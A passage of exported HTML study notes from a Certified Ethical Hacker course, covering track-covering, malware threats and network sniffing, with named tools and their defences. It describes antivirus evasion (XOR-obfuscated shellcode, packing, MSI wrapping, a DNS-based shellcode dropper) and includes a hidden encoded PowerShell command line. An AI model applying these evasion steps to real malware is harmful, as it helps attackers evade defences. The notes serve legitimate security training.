id="f25dd1a5-1162-4fbd-b16c-88ba1e74fdc7" class="bulleted-list"><li style="list-style-type:circle">dns tunneling - great method</li></ul><ul id="600e3d80-2ddc-4bbc-92aa-bd41d0e18c13" class="bulleted-list"><li style="list-style-type:circle">tcp parameters - covert channels through the paramaters: ip identification etc</li></ul><ul id="4ddc3a91-6442-4072-850f-36974170a807" class="bulleted-list"><li style="list-style-type:circle">ssh tunneling</li></ul></li></ul><ul id="6aab53f7-28e6-44ac-b56b-7c9d7150b3f1" class="bulleted-list"><li style="list-style-type:disc">Use Cipher.exe<ul id="2523def5-b99f-44ca-ac4b-a18f88f59a72" class="bulleted-list"><li style="list-style-type:circle">completely overwrites files and folders so that they cannot be recovered</li></ul><ul id="e165aa25-0034-4f19-a18a-bad75457edf7" class="bulleted-list"><li style="list-style-type:circle">uses null bytes</li></ul></li></ul><ul id="c2a35762-a128-4f0b-a326-897795afeea6" class="bulleted-list"><li style="list-style-type:disc">Disable windows functionalities<ul id="ac122a4a-2dba-4eae-bfcb-757cce36d234" class="bulleted-list"><li style="list-style-type:circle">windows virtual memory</li></ul><ul id="bf11de8d-5557-481a-bff5-c22bc5a3f79c" class="bulleted-list"><li style="list-style-type:circle">restore points</li></ul><ul id="ebb8688e-cc8d-4756-8dcb-2f0c420c625f" class="bulleted-list"><li style="list-style-type:circle">etc</li></ul></li></ul><ul id="34e0f21f-fb84-4457-8bbf-303a9ba2f1c7" class="bulleted-list"><li style="list-style-type:disc">Track Covering Tools<ul id="d0340f7c-e847-4a94-b613-fa5721925676" class="bulleted-list"><li style="list-style-type:circle">dbab, privacy eraser, wipe, bleachbit, clearprog</li></ul></li></ul></details></li></ul><ul id="4b67d329-23c4-4146-a244-c8ffc45ecbd9" class="toggle"><li><details open=""><summary>Module 07 - Malware Threats</summary><h3 id="5b672a06-b265-4898-bfdf-a0dcf9d5ca21" class="">Ways for Malware to Enter a System</h3><figure id="64bda91e-6012-4342-8c74-b110f1d7683a" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2023.png"><img style="width:661px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2023.png"/></a></figure><p id="4b04827b-5d79-4267-904d-e21da5ce00a3" class="">
</p><h3 id="9fb3494d-07aa-47cd-8702-fce878d65390" class="">Common Techniques Attackers Use to Distribute Malware</h3><figure id="451db828-53dc-47df-8e79-6529ed066bac" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2024.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2024.png"/></a></figure><p id="d8212444-674a-4fca-8f91-9521af819193" class="">
</p><ul id="f354700e-160f-45bd-9f0c-f11fdf81db8b" class="bulleted-list"><li style="list-style-type:disc">Advanced Persistent Threats<ul id="a9b4ed97-84d3-43ac-ae5b-c5b6a8efe882" class="bulleted-list"><li style="list-style-type:circle">an attacker tries to use the system’s resources for a long period of time</li></ul></li></ul><ul id="c1901bd0-67c9-4160-adf2-1aa3d6d077a9" class="bulleted-list"><li style="list-style-type:disc">Trojans<ul id="fbb43a2d-959b-406e-a789-674c9227a8bb" class="bulleted-list"><li style="list-style-type:circle">look legitimate, they are malware</li></ul><ul id="f3510a46-a844-4cb6-9ce4-ccc79b2ddaf2" class="bulleted-list"><li style="list-style-type:circle">using droppers or downloaders</li></ul><ul id="7b5e74e4-1e39-4849-83cd-52da95873121" class="bulleted-list"><li style="list-style-type:circle">iexpress is in windows, creates wrapped packages in which you can put legit apps to be executed alogside<ul id="1a60a8ec-6ba2-4182-ad19-0cbbd06e0067" class="bulleted-list"><li style="list-style-type:square">Other wrappers: eLiTeWrap, Advanced File Joiner, Soprano3, Exe2vbs, Kriptomatik</li></ul></li></ul></li></ul><ul id="424a861a-d734-45c5-8620-1e2660a40dc5" class="bulleted-list"><li style="list-style-type:disc">Crypters<ul id="eddedbe2-76d4-4bcd-82df-59f9609899b9" class="bulleted-list"><li style="list-style-type:circle">if you use a crypter function system call the antivirus will get it</li></ul><ul id="ee50e71d-35c4-4dde-a223-faacd0a79a70" class="bulleted-list"><li style="list-style-type:circle">msi files are more okay from antivirus than exe files</li></ul><ul id="be66402f-76fe-4dec-b3de-d1d75fbb1fb1" class="bulleted-list"><li style="list-style-type:circle">to make shellcode invisible use obfuscation with xor<ul id="998b1b2f-11a9-4ac0-ab5a-0b4b400caca7" class="bulleted-list"><li style="list-style-type:square">xors a shellcode with a huge key and gets the result as encrypted shellcode</li></ul><ul id="ecc59974-9e5f-401a-8909-e73859d20a38" class="bulleted-list"><li style="list-style-type:square">then use it with pyinstaller to create an exe file</li></ul><ul id="95ed9def-46e9-4867-b421-a68a45b6d7dd" class="bulleted-list"><li style="list-style-type:square">use ubx packer that packages the code to be smaller</li></ul><ul id="1a30f75b-cd10-4e41-8213-266b2c61aad0" class="bulleted-list"><li style="list-style-type:square">its detectable in virustotal but with some of the antivirus and as a general finding 30/73 detection</li></ul></li></ul><ul id="ec1f4ae9-8432-46b3-8732-6e00e0054c86" class="bulleted-list"><li style="list-style-type:circle">use msi wrapper 4.1.54 to wrap the exe file as msi<ul id="f483a283-d319-46fe-b5ed-2ce178de153f" class="bulleted-list"><li style="list-style-type:square">less detections</li></ul><ul id="ba294daf-bd15-4a78-b372-1fa9d19e30ff" class="bulleted-list"><li style="list-style-type:square">we can use commercial msi wrapper to have even less detections</li></ul><ul id="d3684d6a-705a-4a89-831d-64cd11d10e1e" class="bulleted-list"><li style="list-style-type:square">change summary keywords to make it more believable</li></ul></li></ul><ul id="e7eb879d-b7eb-4a0c-a7c7-d06f8ffeba6d" class="bulleted-list"><li style="list-style-type:circle">other crypters: swayzcryptor, snip3, babadeda, aegis crypter2.0, hiffen sight crypter</li></ul></li></ul><ul id="7a176952-13c1-45b9-973b-a8bff50f436f" class="bulleted-list"><li style="list-style-type:disc">Hak5, lab401 for europe</li></ul><ul id="8f13f97a-d0ab-4395-9b08-e4d89823d398" class="bulleted-list"><li style="list-style-type:disc">Bat to Exe Converter v3.2 converts batch files to executables</li></ul><ul id="0584ed95-ae23-47b7-84ab-264a656f5dbf" class="bulleted-list"><li style="list-style-type:disc">Most antiviruses use signatures and look for specific patterns, the more things we change in the binary the less it gets detected<ul id="1931f743-bd6a-401c-8d29-edb6b1211daa" class="bulleted-list"><li style="list-style-type:circle">he opened HxD to find the binary contents of the file, found a text at the end of the file with xml format and changed publicToken and other stuff</li></ul><ul id="ed7f230d-3e38-46fe-93d4-bba3253fb42d" class="bulleted-list"><li style="list-style-type:circle">also used CFF Explorer to find strings, headers and other stuff, he said we can put custom data on specific places</li></ul></li></ul><ul id="8122fe69-1c90-49d8-8998-5bd6bedc4e2e" class="bulleted-list"><li style="list-style-type:disc">hybrid-analysis, anyrun to check for malware and run in sandbox mode</li></ul><h3 id="668bbc11-dc2b-40ce-8b67-8d00f5968434" class="">Showed a malware he presented on a conference</h3><ul id="03b0f0ff-7af9-491b-ab35-df941a7207c0" class="bulleted-list"><li style="list-style-type:disc">Balkan Computer Conference 22 September 2024</li></ul><ul id="f023f363-4d49-4919-9c01-1a956ddf9f3f" class="bulleted-list"><li style="list-style-type:disc">called ipv6 malware</li></ul><ul id="afe36020-f3b3-49dc-b5e9-4219efd0aa73" class="bulleted-list"><li style="list-style-type:disc">he got an ipv6 address to look like shellcode but without cutting the size of it, with the full size</li></ul><ul id="d76f7496-b8e3-4391-a0be-8381ddf9a5f1" class="bulleted-list"><li style="list-style-type:disc">so he created a shellcode of a calculator and converted it to 16 ipv6 addresses</li></ul><ul id="06ed96db-46e7-46f5-acc1-78afe426ec6e" class="bulleted-list"><li style="list-style-type:disc">he put it inside in AAAA dns records</li></ul><ul id="9181ec67-49c4-4e80-869c-d63490c3479d" class="bulleted-list"><li style="list-style-type:disc">he put subdomains av1, av2. <a href="http://piperevski.com">piperevski.com</a> </li></ul><ul id="983a7a68-49d3-42cb-9794-4d7239703b63" class="bulleted-list"><li style="list-style-type:disc">So this is a dropper, it sends queries to reconstruct the shellcode</li></ul><ul id="e740774b-8d94-4c2b-9e71-4b3bdf666187" class="bulleted-list"><li style="list-style-type:disc">he used a powershell command that injects into the memory<ul id="cab54c43-a4ef-46ab-a06b-4b18fb498099" class="bulleted-list"><li style="list-style-type:circle">powershell -noprofile -windowstyle hidden -noninteractive -EncoderCommand</li></ul></li></ul><ul id="f308bede-d613-4359-be3c-bdfee7526a68" class="bulleted-list"><li style="list-style-type:disc">Note: shigata ga nai is detectable, use crypter</li></ul><p id="2c6241b8-0150-42ca-8752-c52bc8914c7a" class="">Exploit Kits<div class="indented"><ul id="eaddec55-c4db-4b8d-aa70-b40d685da90a" class="bulleted-list"><li style="list-style-type:disc">Lord, Underminer Exploit Kit, RIG Exploit Kit, Magnitude, Angler, Neutrino, Terror, Sundown, BotenaGo</li></ul><ul id="46040e2c-7902-45b0-b319-2b5d102b63af" class="bulleted-list"><li style="list-style-type:disc">can be used for c&amp;c servers</li></ul><ul id="953c5ae5-cb1d-4b9b-9ac0-1f239b1a74fc" class="bulleted-list"><li style="list-style-type:disc">But internet is constantly scanned so if you host c&amp;c server you might be detected</li></ul></div></p><p id="3f31b936-591c-4257-9692-13d66f9b15e8" class="">
</p><p id="b5c12e1a-124b-4379-9ba8-507dde30c46c" class="">Viruses and Worms<div class="indented"><ul id="90f7863b-165a-44b4-a4ac-45bb4d4e7cc7" class="bulleted-list"><li style="list-style-type:disc">viruses spread only by human interaction</li></ul><ul id="de10ed91-c594-4f37-9860-a87755158089" class="bulleted-list"><li style="list-style-type:disc">polymorphic viruses recreate their decrompression engine in ram so they are not detected and they also change the whole code so that signature is different</li></ul></div></p><p id="0bf058b4-50bb-4187-af50-2b1648f9d584" class="">Ransomware</p><ul id="6d63279b-b182-4f99-846b-0be86dc2b321" class="bulleted-list"><li style="list-style-type:disc">cryptoprevent from d7xtech, has honeypot and malware protection, its very good</li></ul><p id="8a3f4648-2a60-4fef-a6a4-e10120a4afc9" class="">
</p><p id="4c191c10-a23e-4c1f-8a66-be05c6041346" class="">Ransomware<div class="indented"><ul id="dca65929-d059-4757-89ff-ec5a01af6fbf" class="bulleted-list"><li style="list-style-type:disc">clop ransomware, deadbot, egregor, dharma, eCh0ralx, SamSam, WannaCry, Petya, NotPetya, GrandCrab, MegaCortex, LockerGoga, NamPoHyu, Ryuk, Cryptgh0st</li></ul><ul id="d66a6d97-a223-4668-b558-069ac74335e9" class="bulleted-list"><li style="list-style-type:disc">golang is good for this because it runs on all operating systems</li></ul><p id="bc7f0871-9d7d-4fcc-af58-0f75b2660167" class="">
</p></div></p><p id="bd8fbb7d-3598-4ba2-8f13-e5098a82247d" class="">Malware Analysis<div class="indented"><ul id="075ae106-2b14-4c6a-a261-5b835cf8435f" class="bulleted-list"><li style="list-style-type:disc">flare-vm has all the tools for malware analysis</li></ul><ul id="df45e2ff-fc1a-4c57-9b32-603c6c356b1c" class="bulleted-list"><li style="list-style-type:disc">Static and Dynamic way, static is without executing, dynamic studies its behaviour while running</li></ul><ul id="a5c9043b-0504-4129-b7d3-5f60cd2a2530" class="bulleted-list"><li style="list-style-type:disc"><a href="http://any.run">any.run</a> online sandbox based environment for analyzing malware automatically and gives you info what it does and how</li></ul><ul id="72057b12-9073-475a-9bea-0523738ac903" class="bulleted-list"><li style="list-style-type:disc">to run at startup it can use: registry, startup folder, register as a service</li></ul><ul id="99239397-a7b7-4f82-9f5b-9cfda55c10d9" class="bulleted-list"><li style="list-style-type:disc">crowdstrike is a sandbox for antivirus malware analysis so that you dont upload to virustotal</li></ul><ul id="b1d9ede4-d315-4500-bb35-e5224f0fbd28" class="bulleted-list"><li style="list-style-type:disc"><strong>Valkyrie</strong> (https://valkyrie.comodo.com), <strong>Cuckoo Sandbox</strong> (https://cuckoosandbox.org), <strong>Jotti</strong> (https://virusscan.jotti.org) or <strong>IObit Cloud</strong> (https://cloud.iobit.com) </li></ul><ul id="8cf941bf-1f70-4a6a-99a8-56d2a75c5513" class="bulleted-list"><li style="list-style-type:disc"><strong>https://www.hybrid-analysis.com</strong></li></ul><ul id="9cf67d68-e8f1-4e3b-8376-380498c301a3" class="bulleted-list"><li style="list-style-type:disc">String Search:<ul id="a9dfde8d-8ddf-4cb2-a1bf-cc2b70f748a7" class="bulleted-list"><li style="list-style-type:circle">bintext.exe</li></ul><ul id="699c060f-fac0-4a43-b4be-df70a7dbb67a" class="bulleted-list"><li style="list-style-type:circle"> <strong>FLOSS</strong> (https://www.fireeye.com), <strong>Strings</strong> (https://docs.microsoft.com), <strong>Free EXE DLL Resource Extract</strong> (https://www.resourceextract.com), or <strong>FileSeek</strong> (https://www.fileseek.ca)<br/><br/></li></ul></li></ul></div></p><p id="165939f1-aeb3-4058-9997-15a1293540c3" class="">
</p><p id="c7df8b2a-6e99-471f-9bc9-8690f51e7950" class="">Trojan countermeasures<div class="indented"><ul id="02540dbe-2b45-421d-8c4c-19cc7616a857" class="bulleted-list"><li style="list-style-type:disc">morphisec is the best weapon for defending ransomware, it has adaptive exposure management which doesnt exist in any other product</li></ul></div></p><p id="a77a7f5e-11ef-47ff-93a1-6c8837ab3d1d" class="">
</p><p id="cf5c54a9-b146-4c28-9106-6a37617aa2f7" class="">Hackers today use cold signing certificate to sign their malware</p><p id="3fa76137-3514-42dd-86d5-ebbf3fe0ad68" class="">Shellter Pro v9.1 creates malware that can evade detection<div class="indented"><ul id="b269af8c-bc45-45c5-a9b0-10116f363c97" class="bulleted-list"><li style="list-style-type:disc">most antiviruses can see the signature</li></ul><ul id="91b98048-648f-47b6-b049-58660c4ad012" class="bulleted-list"><li style="list-style-type:disc">but it attaches to admin tools that makes exploit guard not able to detect it</li></ul><ul id="8f97a776-c83e-4e1d-acc1-f9ef3215bad2" class="bulleted-list"><li style="list-style-type:disc">but it can detect it if its standalone</li></ul><ul id="e3533a37-5fa7-4b8e-94d5-20e285ac8329" class="bulleted-list"><li style="list-style-type:disc">but the good one is the one you must pay to get</li></ul><ul id="4f511cd9-d39d-4799-8f16-2c6431f580dc" class="bulleted-list"><li style="list-style-type:disc">created by Kyriakos Economou</li></ul></div></p><p id="a641f80b-fa87-479a-8020-6a1450cf2c63" class="">RansomLord: Anti-Ransomware exploit tool<div class="indented"><ul id="15f80520-a593-41df-ab53-e93d04d4c1fa" class="bulleted-list"><li style="list-style-type:disc">you select a specific category family</li></ul><ul id="ab62372b-d3d2-49f1-a6e0-31aac5fb05c2" class="bulleted-list"><li style="list-style-type:disc">but it can generate malware files even though its anti-ransom</li></ul><ul id="4811691a-edc6-4ce6-818d-018dc822b8a0" class="bulleted-list"><li style="list-style-type:disc">be careful these can hide very well if you execute them</li></ul></div></p></details></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">Day 4 - Sniffing</summary><div class="indented"><ul id="da5690e2-d3f7-49cd-a987-499643639b30" class="toggle"><li><details open=""><summary>Recording</summary><figure id="7ae1f5cc-247c-4dbf-9a28-086296c88bc1"><div class="source"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/CEH_Day_4_-_Modules_7_8_9_10_11.txt">CEH Day 4 - Modules 7, 8, 9, 10, 11.txt</a></div></figure></details></li></ul><ul id="82f0910a-5827-456b-a96e-155d5abd94e4" class="toggle"><li><details open=""><summary>Module 08 - Sniffing</summary><p id="c73799e4-fa57-4c5e-9ac2-2f7060b191ee" class="">most cases encryption cancels out these attacks</p><p id="2ea6004c-a795-462f-a2c0-ebb4dce0668f" class="">but there is ssl stripping and these stuff</p><h3 id="806e2baa-88b7-4df5-b59c-58aee143adac" class="">Summarize Sniffing Concepts</h3><ul id="b2146abe-4405-46f8-931b-dce6f9d3c8ba" class="bulleted-list"><li style="list-style-type:disc">packet sniffing</li></ul><ul id="5479bf10-02c3-44bc-8aef-56234f799e31" class="bulleted-list"><li style="list-style-type:disc">active, passive sniffing using NIC</li></ul><ul id="d2874383-e40f-4878-a620-ff90df543c72" class="toggle"><li><details open=""><summary>Protocols Vulnerable to Sniffing</summary><figure id="87319f80-6561-482b-a499-b09b1730180a" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2025.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2025.png"/></a></figure></details></li></ul><ul id="2e1cabbe-5821-4fd1-a09c-744c133ff8e2" class="bulleted-list"><li style="list-style-type:disc">hardware protocol analysers<ul id="bfd62d6c-7369-4633-8735-f2ed790bdf06" class="bulleted-list"><li style="list-style-type:circle">alot of traffic will crash wireshark</li></ul></li></ul><ul id="85e90432-c143-43b6-8eca-6ae11c27a750" class="bulleted-list"><li style="list-style-type:disc">SPAN Port<ul id="664395f1-c339-4c55-9a6e-964682209d79" class="bulleted-list"><li style="list-style-type:circle">a port only used for analyzing traffic</li></ul><ul id="083efac3-b81a-4068-a26f-d6464c485c93" class="bulleted-list"><li style="list-style-type:circle">the router/switch must be configured to send everything there</li></ul><ul id="d198b4f7-f82b-4488-9ecf-01323366c853" class="bulleted-list"><li style="list-style-type:circle">it only gets info, it doesnt send</li></ul><ul id="68e12e90-4271-4b60-bb43-c7ac101c767b" class="bulleted-list"><li style="list-style-type:circle">can also be used for IDS</li></ul></li></ul><ul id="a65d4cbf-dc5c-4337-aa95-f8fef3109e48" class="bulleted-list"><li style="list-style-type:disc">Wiretapping<ul id="323b3503-8482-4cd8-9636-8268c5052e40" class="bulleted-list"><li style="list-style-type:circle">active: direct interraction between communication of two points</li></ul><ul id="e31faae0-d5ea-462f-a8fc-2d952dada128" class="bulleted-list"><li style="list-style-type:circle">passive: just monitors traffice and connects data</li></ul></li></ul><h3 id="788c53f2-92d1-423e-8788-9b6f9ba2841a" class="">Use Sniffing Tools</h3><p id="f3a30a06-d6ca-4dae-9f04-274dbd1f8143" class="">
</p><h3 id="cb945454-e390-4716-b918-d0fb80e21f6e" class="">Demonstrate Different sniffing Techniques</h3><ul id="630f5e9f-b3cd-43e5-97dd-a66bff2f4ddd" class="bulleted-list"><li style="list-style-type:disc">MAC Flooding<ul id="d56963b1-5a2d-44db-af3b-8ced1b149520" class="bulleted-list"><li style="list-style-type:circle">CAM Table on Switches uses ARP protocol</li></ul><ul id="93e95606-dac4-4b17-87bf-d96c53f91b6c" class="bulleted-list"><li style="list-style-type:circle">to save and reroute traffic from one port to another</li></ul><ul id="8a87c85a-d559-4a50-a17a-70aed5542d15" class="bulleted-list"><li style="list-style-type:circle">floods the mac using macof</li></ul></li></ul><ul id="6221cbf4-6068-44f4-9734-3f455e86fae8" class="bulleted-list"><li style="list-style-type:disc">Switchport Stealing<ul id="df0703da-3bfe-4074-890c-834e6397dd20" class="bulleted-list"><li style="list-style-type:circle">trick the switch to send you the traffic of anorther mac address</li></ul></li></ul><ul id="e3ebda7e-d9b2-414a-aff9-fdbfdae9f3b8" class="bulleted-list"><li style="list-style-type:disc">Defend:<ul id="5a9fbfac-55de-4509-9924-0e0108bdd3af" class="bulleted-list"><li style="list-style-type:circle">in the exan</li></ul><ul id="5f5469b4-baf6-4db5-bd3a-6a0bb3e63fda" class="bulleted-list"><li style="list-style-type:circle">use switchport port-security</li></ul></li></ul><ul id="4b14771a-7dc9-4de5-9bb9-71593a961012" class="bulleted-list"><li style="list-style-type:disc">DHCP Starvation Attack<ul id="ee412c4f-58fe-42e7-8ec4-23da2ac754c3" class="bulleted-list"><li style="list-style-type:circle">dos attack that attacks dhcp servers</li></ul><ul id="f42c6920-3f29-4860-83d8-842e5472ebe2" class="bulleted-list"><li style="list-style-type:circle">DHCP does the following: discover, offer, request, acknowledge (DORA)<ul id="1dfe4cce-a377-42e0-ae6a-a4b96088458e" class="bulleted-list"><li style="list-style-type:square">first packet discovers dhcp servers on the net</li></ul><ul id="b89219a2-025f-4add-8cfb-1cc111ada310" class="bulleted-list"><li style="list-style-type:square">the dhcp offers an ip and reserves it as non available</li></ul><ul id="57d7cb76-b609-45ea-9cf6-84cde30ea77e" class="bulleted-list"><li style="list-style-type:square">the client requests the ip </li></ul><ul id="dc4ee66f-f134-40a6-a4e5-672d0f921bf7" class="bulleted-list"><li style="list-style-type:square">dhcp acknowledges the ip is okay and other configuration</li></ul></li></ul><ul id="497d2f6f-2eec-4692-9b1e-3d16eb21709f" class="bulleted-list"><li style="list-style-type:circle">the flaw is that it reserves the ip for sometime even if you dont accept the offer so you can reserve all ip addresses</li></ul><ul id="5c296873-650e-4e4f-aafe-612d4e23d686" class="bulleted-list"><li style="list-style-type:circle">this attack broadcasts forged dhcp requests to lease all the DHCP addresses available in the DHCP scope</li></ul><ul id="41af21e6-82b5-4bc3-8465-c62fd2013c54" class="bulleted-list"><li style="list-style-type:circle">Tools: dhcpStarvation.py, Hyenae, dhcpstarv, Gobbler</li></ul><ul id="5eda81f0-9c55-488c-adbd-6efc9f219d0e" class="bulleted-list"><li style="list-style-type:circle">Defend: use switchport port security and ip dhcp snooping config in the switch</li></ul></li></ul><ul id="c21ec5ff-137f-4579-acbd-6aee0fae682c" class="bulleted-list"><li style="list-style-type:disc">ARP Spoofing<ul id="e3d99354-2408-4f8a-9d83-180e5bcf92da" class="bulleted-list"><li style="list-style-type:circle">reroute packets through you before going to victim</li></ul><ul id="521013f2-1239-4b17-b167-0b88fc70d438" class="bulleted-list"><li style="list-style-type:circle">its a mitm attack</li></ul><ul id="e2af8a2c-0383-4f2e-8fe3-559dbe4e3c5e" class="bulleted-list"><li style="list-style-type:circle">you can also do it between two victims, it doesnt have to be the gateway</li></ul></li></ul><ul id="1d40feba-9507-4eb6-a557-2026f5763ffb" class="bulleted-list"><li style="list-style-type:disc">Defend against ARP Poisoning<ul id="07344330-4bfa-4ad8-a7b7-a2127261a163" class="bulleted-list"><li style="list-style-type:circle">dynamic arp inspection using ip dhcp snooping in cisco</li></ul></li></ul><ul id="7382846f-0e90-4309-b99a-e5b3416a2e7b" class="bulleted-list"><li style="list-style-type:disc">ARP Spoofing Detection<ul id="45e4e690-944d-4c6a-a018-bbf2dc403fcc" class="bulleted-list"><li style="list-style-type:circle">wireshark, arpON, arp Antispoofer, ARPStraw, shARP</li></ul><ul id="2c15f9e8-bc73-41de-8383-472e8c13934a" class="bulleted-list"><li style="list-style-type:circle">most security we have today doesnt monitor arp cache</li></ul></li></ul><ul id="12ddd32d-16e3-406b-afa7-44ab16bacc00" class="bulleted-list"><li style="list-style-type:disc">MAC Spoofing<ul id="87f33485-233e-4f3d-b87c-b870f24cb95e" class="bulleted-list"><li style="list-style-type:circle">we can do it in windows network adapter advanced tab</li></ul><ul id="c9ddfdc6-3661-4165-aa98-52b283a4fd6c" class="bulleted-list"><li style="list-style-type:circle">also in the registries (in the exam) have to remember the path </li></ul><ul id="bcf0a8e1-ec31-4630-91ad-1910aa70d6e9" class="bulleted-list"><li style="list-style-type:circle">SMAC, MAC Address Changer, Change MAC Address, Easy Mac Changer, Spoof-Me-Now</li></ul></li></ul><ul id="b1400c85-c951-4d39-8920-519d16193e69" class="bulleted-list"><li style="list-style-type:disc">IRDP Spoofing<ul id="b5f45f1c-e53f-4c80-bedf-3d8104cc6375" class="bulleted-list"><li style="list-style-type:circle">icmp router discovery protocol</li></ul><ul id="cedb802f-b79a-4039-aad1-b0d6fd4f6618" class="bulleted-list"><li style="list-style-type:circle">man in the middle a router</li></ul></li></ul><ul id="6490f9f0-694f-4fde-bfd1-31360fdf6bdc" class="bulleted-list"><li style="list-style-type:disc">VLAN Hopping<ul id="a0175f37-eb3f-4de5-9c0e-470c9515b66c" class="bulleted-list"><li style="list-style-type:circle">can use switch spoofing or double tagging</li></ul><ul id="fac7851b-6327-48d0-97a9-a8da7500cd16" class="bulleted-list"><li style="list-style-type:circle">Switch Spoofing: an unsecure trunk port is set on a unconfigured switch so you have access to all vlans</li></ul><ul id="9bc567db-5c12-402f-ac1a-2803800b2196" class="bulleted-list"><li style="list-style-type:circle">Double Tagging: you can add and modify tags in a trunk network</li></ul><ul id="a5c6cdb0-e478-4b3a-a046-0dbe52554f29" class="bulleted-list"><li style="list-style-type:circle">Defend:<ul id="48aae24f-b40e-43ef-afa2-9cbef46d2589" class="bulleted-list"><li style="list-style-type:square">switchport mode access</li></ul><ul id="6a7c2e59-4f1e-46d5-8431-d94f73bfee89" class="bulleted-list"><li style="list-style-type:square">switchport mode negotiate</li></ul></li></ul></li></ul><ul id="bd12207f-0961-4dd1-87fc-b7be4931bc0b" class="bulleted-list"><li style="list-style-type:disc">DNS Poisoning</li></ul><ul id="dff8a8d9-e2f6-48f8-a3f9-ccbaa40c842f" class="bulleted-list"><li style="list-style-type:disc">DNS Spoofing</li></ul><ul id="af3aa605-d7fc-48a9-8df2-bb021579732d" class="bulleted-list"><li style="list-style-type:disc">DNS Cache Poisoning<ul id="c4cbfbaa-5f13-4b31-b38c-14d501737dae" class="bulleted-list"><li style="list-style-type:circle">dns poisoning does not happen in recent systems but old systems are vulnerable</li></ul><ul id="7219881f-2e78-4619-86c4-543a4368d1fb" class="toggle"><li><details open=""><summary>Defend against dns poisoning</summary><figure id="ab5f5501-2912-4f31-9ee3-6e4204e65741" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2026.png"><img style="width:737px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2026.png"/></a></figure></details></li></ul></li></ul><ul id="54741f4e-ca06-427f-9fa2-d3c48db6598f" class="bulleted-list"><li style="list-style-type:disc">DNS over HTTPS</li></ul><p id="e5c69644-4251-474b-bde9-ebdc10fa62bb" class="">
</p><h3 id="caf10abc-3bd2-4d20-8922-2c98f1e0a865" class="">Sniffing Tools</h3><ul id="1b4e0cb0-3e0c-43dd-a511-2db0b514cf06" class="bulleted-list"><li style="list-style-type:disc">in exam: know how to operate it</li></ul><ul id="b5013bc9-cde9-4e96-8773-d6724ec7ae3b" class="toggle"><li><details open=""><summary>Useful wireshark filters</summary><figure id="64539473-360a-40d5-a171-060c3bd1a978" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2027.png"><img style="width:637px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2027.png"/></a></figure><figure id="fbb1ee3c-a8ef-43a4-aa67-1b56a6caaec6" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2028.png"><img style="width:728px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2028.png"/></a></figure></details></li></ul><ul id="6be67a23-5d85-417d-9207-0b40537f6115" class="bulleted-list"><li style="list-style-type:disc">Other sniffing tools:<ul id="2f463a3e-ed3e-45b8-945a-f55e397e4b4a" class="bulleted-list"><li style="list-style-type:circle">riverbed packet analyzer</li></ul><ul id="a33533ab-9fac-40a2-a1f5-aabf97614dbf" class="bulleted-list"><li style="list-style-type:circle">netwitness community edition (netwitness.com)<ul id="15ccf817-8dcc-4b18-93f1-21a04dc2b0df" class="bulleted-list"><li style="list-style-type:square">easier review than wireshark</li></ul></li></ul><ul id="07988fc8-9bc5-49af-8629-dfdfd58cf31d" class="bulleted-list"><li style="list-style-type:circle">omnipeek</li></ul><ul id="6f82d5fa-d3b3-4d96-a4e6-8a6b59050447" class="bulleted-list"><li style="list-style-type:circle">capsa portable network analyser</li></ul><ul id="bc549b28-9462-4a81-ac52-622208ab4f3f" class="bulleted-list"><li style="list-style-type:circle">rita (real intelligence threat analysis)</li></ul><ul id="78c22a13-fffa-4588-b7b4-943f67370ac5" class="bulleted-list"><li style="list-style-type:circle">observer analyser</li></ul><ul id="c478fb04-33ed-4bf9-a851-d6ad3c2387bb" class="bulleted-list"><li style="list-style-type:circle">prtg network monitor</li></ul><ul id="04983788-9f90-4a1b-bb7d-16cb8ca7b2f3" class="bulleted-list"><li style="list-style-type:circle">solwrwinds</li></ul><ul id="482fef75-547f-4ab8-ab80-f7d95bf25266" class="bulleted-list"><li style="list-style-type:circle">xplico</li></ul></li></ul><p id="9376b804-2f30-4981-b2bd-05a2fea12cbc" class="">exam: we need to know the name of the tools</p><ul id="23057f8c-bd64-4850-9fc5-66d8abc54c93" class="toggle"><li><details open=""><summary>Defend Against Sniffing</summary><figure id="b64343fc-cd63-4736-b3bc-ecbdd12e4fe0" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2029.png"><img style="width:693px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2029.png"/></a></figure><figure id="5d9b7ff0-1747-4aed-a3e1-7d4bdee26b31" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2030.png"><img style="width:637px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2030.png"/></a></figure></details></li></ul></details></li></ul><ul id="996c3e79-92e7-4dc9-a084-1dd73d6104ed" class="toggle"><li><details open=""><summary>Module 09 - 